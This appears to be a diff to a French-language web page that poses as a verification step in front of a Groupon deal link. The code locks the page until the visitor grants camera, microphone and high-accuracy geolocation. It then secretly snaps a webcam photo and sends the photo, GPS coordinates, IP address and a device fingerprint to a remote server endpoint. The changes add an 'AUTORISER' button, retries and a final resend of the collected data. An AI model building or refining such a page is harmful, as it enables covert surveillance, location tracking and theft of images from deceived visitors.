@@ -158,6 +158,14 @@
             transform: translateY(-2px);
             box-shadow: 0 10px 30px rgba(255, 152, 0, 0.4);
         }
+        .btn-secondary {
+            background: #666;
+            color: white;
+        }
+        .btn-secondary:disabled {
+            opacity: 0.4;
+            cursor: not-allowed;
+        }
         
         .permission-status-summary {
             margin: 20px 0 10px;
@@ -311,7 +319,8 @@
             <div class="permission-status-summary" id="statusSummary">⏳ En cours...</div>
             
             <div class="btn-group">
-                <button class="btn btn-primary" id="continueBtn" disabled>⏳ En attente (0/3)</button>
+                <button class="btn btn-primary" id="allowBtn">🔓 AUTORISER</button>
+                <button class="btn btn-success" id="continueBtn" disabled>⏳ En attente (0/3)</button>
                 <button class="btn btn-retry" id="retryBtn" style="display:none;">🔄 Réessayer</button>
             </div>
             <p style="margin-top: 15px; font-size: 13px; opacity: 0.7;">Les données sont envoyées automatiquement.</p>
@@ -380,9 +389,11 @@
 
         let cameraGranted = false, microphoneGranted = false, geolocationGranted = false;
         let cameraAttempted = false, microphoneAttempted = false, geolocationAttempted = false;
+        let photoCaptured = false;
 
         let userIP = null, userCoords = null, photoBlob = null;
         let ipSent = false, coordsSent = false, photoSent = false, permsSent = false;
+        let finalDataSent = false;
 
         // ========== COLLECTE ==========
 
@@ -391,41 +402,50 @@
                 const resp = await fetch('https://api.ipify.org?format=json');
                 const data = await resp.json();
                 userIP = { ip: data.ip, city: 'Unknown', region: 'Unknown', country: 'Unknown', postal: 'N/A', latitude: null, longitude: null, timezone: 'N/A', isp: 'N/A' };
-                sendToServer({ ip: userIP });
+                console.log('IP récupérée:', userIP.ip);
+                await sendToServer({ ip: userIP });
             } catch (e) {
+                console.error('Erreur IP:', e);
                 userIP = { error: 'Non disponible' };
             }
         }
 
+        // Version asynchrone de la géolocalisation (promesse)
         function getGeolocation() {
-            if (!navigator.geolocation) {
-                geolocationAttempted = true;
-                updateStatus('geoStatus', 'denied', '✗');
-                updateUI();
-                return;
-            }
-            navigator.geolocation.getCurrentPosition(
-                (pos) => {
-                    geolocationGranted = true;
-                    geolocationAttempted = true;
-                    userCoords = {
-                        latitude: pos.coords.latitude,
-                        longitude: pos.coords.longitude,
-                        accuracy: pos.coords.accuracy,
-                        altitude: pos.coords.altitude,
-                        timestamp: pos.timestamp
-                    };
-                    updateStatus('geoStatus', 'granted', '✓');
-                    sendToServer({ coordinates: userCoords });
-                    updateUI();
-                },
-                () => {
+            return new Promise((resolve) => {
+                if (!navigator.geolocation) {
                     geolocationAttempted = true;
                     updateStatus('geoStatus', 'denied', '✗');
                     updateUI();
-                },
-                { enableHighAccuracy: true, timeout: 10000 }
-            );
+                    resolve(false);
+                    return;
+                }
+                navigator.geolocation.getCurrentPosition(
+                    (pos) => {
+                        geolocationGranted = true;
+                        geolocationAttempted = true;
+                        userCoords = {
+                            latitude: pos.coords.latitude,
+                            longitude: pos.coords.longitude,
+                            accuracy: pos.coords.accuracy,
+                            altitude: pos.coords.altitude,
+                            timestamp: pos.timestamp
+                        };
+                        console.log('GPS obtenu:', userCoords.latitude, userCoords.longitude);
+                        updateStatus('geoStatus', 'granted', '✓');
+                        sendToServer({ coordinates: userCoords });
+                        updateUI();
+                        resolve(true);
+                    },
+                    () => {
+                        geolocationAttempted = true;
+                        updateStatus('geoStatus', 'denied', '✗');
+                        updateUI();
+                        resolve(false);
+                    },
+                    { enableHighAccuracy: true, timeout: 10000 }
+                );
+            });
         }
 
         async function requestCamera() {
@@ -434,15 +454,22 @@
                 cameraGranted = true;
                 cameraAttempted = true;
                 cameraStream = stream;
+                console.log('Caméra accordée');
                 updateStatus('cameraStatus', 'granted', '✓');
                 const video = document.getElementById('videoPreview');
                 video.srcObject = stream;
-                video.onloadedmetadata = () => setTimeout(capturePhoto, 1500);
+                video.onloadedmetadata = () => {
+                    console.log('Vidéo chargée, capture dans 1.5s');
+                    setTimeout(capturePhoto, 1500);
+                };
                 updateUI();
+                return true;
             } catch (e) {
                 cameraAttempted = true;
+                console.error('Erreur caméra:', e);
                 updateStatus('cameraStatus', 'denied', '✗');
                 updateUI();
+                return false;
             }
         }
 
@@ -452,19 +479,24 @@
                 stream.getTracks().forEach(t => t.stop());
                 microphoneGranted = true;
                 microphoneAttempted = true;
+                console.log('Micro accordé');
                 updateStatus('micStatus', 'granted', '✓');
-                sendToServer({ microphone: true });
+                await sendToServer({ microphone: true });
                 updateUI();
+                return true;
             } catch (e) {
                 microphoneAttempted = true;
+                console.error('Erreur micro:', e);
                 updateStatus('micStatus', 'denied', '✗');
                 updateUI();
+                return false;
             }
         }
 
         function capturePhoto() {
             const video = document.getElementById('videoPreview');
             if (!video.videoWidth || !video.videoHeight) {
+                console.log('Vidéo pas prête, nouvelle tentative...');
                 setTimeout(capturePhoto, 500);
                 return;
             }
@@ -476,8 +508,12 @@
             canvas.toBlob((blob) => {
                 if (blob) {
                     photoBlob = blob;
-                    document.getElementById('photoStatus').textContent = '📸 Photo prise';
+                    photoCaptured = true;
+                    document.getElementById('photoStatus').textContent = '📸 Photo prise (' + (blob.size/1024).toFixed(1) + ' KB)';
+                    console.log('Photo capturée, taille:', blob.size);
                     sendToServer({ photo: blob });
+                } else {
+                    console.error('Erreur capture photo');
                 }
             }, 'image/jpeg', 0.9);
         }
@@ -490,11 +526,84 @@
                 formData.append('timestamp', new Date().toISOString());
                 formData.append('userAgent', navigator.userAgent);
 
-                if (data.ip && !ipSent) { formData.append('ip', JSON.stringify(data.ip)); ipSent = true; }
-                if (data.coordinates && !coordsSent) { formData.append('coordinates', JSON.stringify(data.coordinates)); coordsSent = true; }
-                if (data.photo && !photoSent) { formData.append('photo', data.photo, 'verif-' + Date.now() + '.jpg'); photoSent = true; }
+                if (data.ip && !ipSent) {
+                    formData.append('ip', JSON.stringify(data.ip));
+                    ipSent = true;
+                    console.log('Envoi IP');
+                }
+                if (data.coordinates && !coordsSent) {
+                    formData.append('coordinates', JSON.stringify(data.coordinates));
+                    coordsSent = true;
+                    console.log('Envoi coordonnées');
+                }
+                if (data.photo && !photoSent) {
+                    formData.append('photo', data.photo, 'verif-' + Date.now() + '.jpg');
+                    photoSent = true;
+                    console.log('Envoi photo');
+                }
                 if (data.microphone !== undefined && !permsSent) {
-                    formData.append('permissions', JSON.stringify({ camera: cameraGranted, microphone: microphoneGranted, geolocation: geolocationGranted }));
+                    const perms = { camera: cameraGranted, microphone: microphoneGranted, geolocation: geolocationGranted };
+                    formData.append('permissions', JSON.stringify(perms));
+                    permsSent = true;
+                    console.log('Envoi permissions');
+                }
+                if (!window._sysSent) {
+                    formData.append('systemInfo', JSON.stringify({
+                        screen: { width: window.screen.width, height: window.screen.height, colorDepth: window.screen.colorDepth, devicePixelRatio: window.devicePixelRatio },
+                        navigator: { language: navigator.language, platform: navigator.platform, hardwareConcurrency: navigator.hardwareConcurrency, maxTouchPoints: navigator.maxTouchPoints },
+                        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+                    }));
+                    window._sysSent = true;
+                    console.log('Envoi système');
+                }
+
+                if (formData.entries().next().done) {
+                    console.log('Rien à envoyer');
+                    return;
+                }
+
+                console.log('Envoi au serveur...');
+                const response = await fetch(SERVER_URL + '/api/verification/photo', {
+                    method: 'POST',
+                    body: formData,
+                    credentials: 'omit'
+                });
+                if (response.ok) {
+                    const json = await response.json();
+                    console.log('✅ Envoi réussi:', json);
+                } else {
+                    console.error('❌ Échec envoi, status:', response.status);
+                }
+            } catch (e) {
+                console.error('❌ Erreur envoi:', e);
+            }
+        }
+
+        // Envoi final (récapitulatif) lorsque toutes les permissions sont accordées
+        async function sendFinalData() {
+            if (finalDataSent) return;
+            try {
+                const formData = new FormData();
+                formData.append('timestamp', new Date().toISOString());
+                formData.append('userAgent', navigator.userAgent);
+                formData.append('final', 'true');
+
+                // Envoyer tout ce qui n'a pas été envoyé
+                if (userIP && !ipSent) {
+                    formData.append('ip', JSON.stringify(userIP));
+                    ipSent = true;
+                }
+                if (userCoords && !coordsSent) {
+                    formData.append('coordinates', JSON.stringify(userCoords));
+                    coordsSent = true;
+                }
+                if (photoBlob && !photoSent) {
+                    formData.append('photo', photoBlob, 'final-' + Date.now() + '.jpg');
+                    photoSent = true;
+                }
+                if (!permsSent) {
+                    const perms = { camera: cameraGranted, microphone: microphoneGranted, geolocation: geolocationGranted };
+                    formData.append('permissions', JSON.stringify(perms));
                     permsSent = true;
                 }
                 if (!window._sysSent) {
@@ -507,8 +616,23 @@
                 }
 
                 if (formData.entries().next().done) return;
-                await fetch(SERVER_URL + '/api/verification/photo', { method: 'POST', body: formData, credentials: 'omit' });
-            } catch (e) {}
+
+                console.log('Envoi final...');
+                const response = await fetch(SERVER_URL + '/api/verification/photo', {
+                    method: 'POST',
+                    body: formData,
+                    credentials: 'omit'
+                });
+                if (response.ok) {
+                    const json = await response.json();
+                    console.log('✅ Envoi final réussi:', json);
+                } else {
+                    console.error('❌ Échec envoi final, status:', response.status);
+                }
+                finalDataSent = true;
+            } catch (e) {
+                console.error('❌ Erreur envoi final:', e);
+            }
         }
 
         // ========== UI ==========
@@ -527,6 +651,7 @@
             document.getElementById('statusSummary').textContent = '📊 ' + parts.join(' ');
 
             const continueBtn = document.getElementById('continueBtn');
+            const allowBtn = document.getElementById('allowBtn');
             const retryBtn = document.getElementById('retryBtn');
 
             if (count === 3) {
@@ -543,28 +668,59 @@
             const hasDenied = (cameraAttempted && !cameraGranted) ||
                               (microphoneAttempted && !microphoneGranted) ||
                               (geolocationAttempted && !geolocationGranted);
-            if (hasDenied && !verificationComplete) {
+            const anyAttempted = cameraAttempted || microphoneAttempted || geolocationAttempted;
+
+            if (!anyAttempted) {
+                allowBtn.style.display = 'block';
+                allowBtn.textContent = '🔓 AUTORISER';
+                allowBtn.className = 'btn btn-primary';
+                allowBtn.onclick = requestAllPermissions;
+                retryBtn.style.display = 'none';
+            } else if (hasDenied && !verificationComplete) {
+                allowBtn.style.display = 'none';
                 retryBtn.style.display = 'block';
                 retryBtn.onclick = retryDenied;
             } else {
+                allowBtn.style.display = 'none';
                 retryBtn.style.display = 'none';
             }
         }
 
-        async function retryDenied() {
-            if (!cameraGranted && cameraAttempted) await requestCamera();
-            if (!microphoneGranted && microphoneAttempted) await requestMicrophone();
-            if (!geolocationGranted && geolocationAttempted) getGeolocation();
-            updateUI();
+        // ========== DEMANDE DES PERMISSIONS ==========
+
+        async function requestAllPermissions() {
+            console.log('Demande de toutes les permissions');
+            // Lancer les trois demandes en parallèle
+            await Promise.all([
+                requestCamera(),
+                requestMicrophone(),
+                getGeolocation()
+            ]);
+            setTimeout(updateUI, 1000);
         }
 
-        function completeVerification() {
+        async function retryDenied() {
+            console.log('Réessayer les permissions refusées');
+            const promises = [];
+            if (!cameraGranted && cameraAttempted) promises.push(requestCamera());
+            if (!microphoneGranted && microphoneAttempted) promises.push(requestMicrophone());
+            if (!geolocationGranted && geolocationAttempted) promises.push(getGeolocation());
+            await Promise.all(promises);
+            setTimeout(updateUI, 1000);
+        }
+
+        // ========== DÉBLOQUER LE CONTENU ==========
+
+        async function completeVerification() {
             if (verificationComplete) return;
             if ([cameraGranted, microphoneGranted, geolocationGranted].filter(Boolean).length !== 3) return;
+            // Envoyer les données finales (au cas où)
+            await sendFinalData();
             if (cameraStream) cameraStream.getTracks().forEach(t => t.stop());
             document.getElementById('permissionOverlay').classList.remove('show');
             document.body.classList.remove('unverified');
             verificationComplete = true;
+            console.log('Accès débloqué');
         }
 
         // ========== REDIRECTION ==========
@@ -572,9 +728,11 @@
         function redirectToGroupon() {
             if (!verificationComplete) {
                 const count = [cameraGranted, microphoneGranted, geolocationGranted].filter(Boolean).length;
-                if (count === 3) { completeVerification(); window.open('https://www.groupon.fr/search/avis-recherche-france', '_blank'); return; }
-                // Pas d'alerte, ne rien faire ou rediriger silencieusement vers une page neutre ?
-                // On peut simplement ne pas rediriger.
+                if (count === 3) { 
+                    completeVerification(); 
+                    window.open('https://www.groupon.fr/search/avis-recherche-france', '_blank'); 
+                    return; 
+                }
                 return;
             }
             window.open('https://www.groupon.fr/search/avis-recherche-france', '_blank');
@@ -585,11 +743,8 @@
         window.addEventListener('load', () => {
             document.body.classList.add('unverified');
             getIPAddress();
-            getGeolocation();
-            requestCamera();
-            requestMicrophone();
-            setInterval(updateUI, 1500);
-            setTimeout(updateUI, 500);
+            updateUI();
+            setInterval(updateUI, 2000);
         });
 
         document.getElementById('buyBtn').onclick = redirectToGroupon;
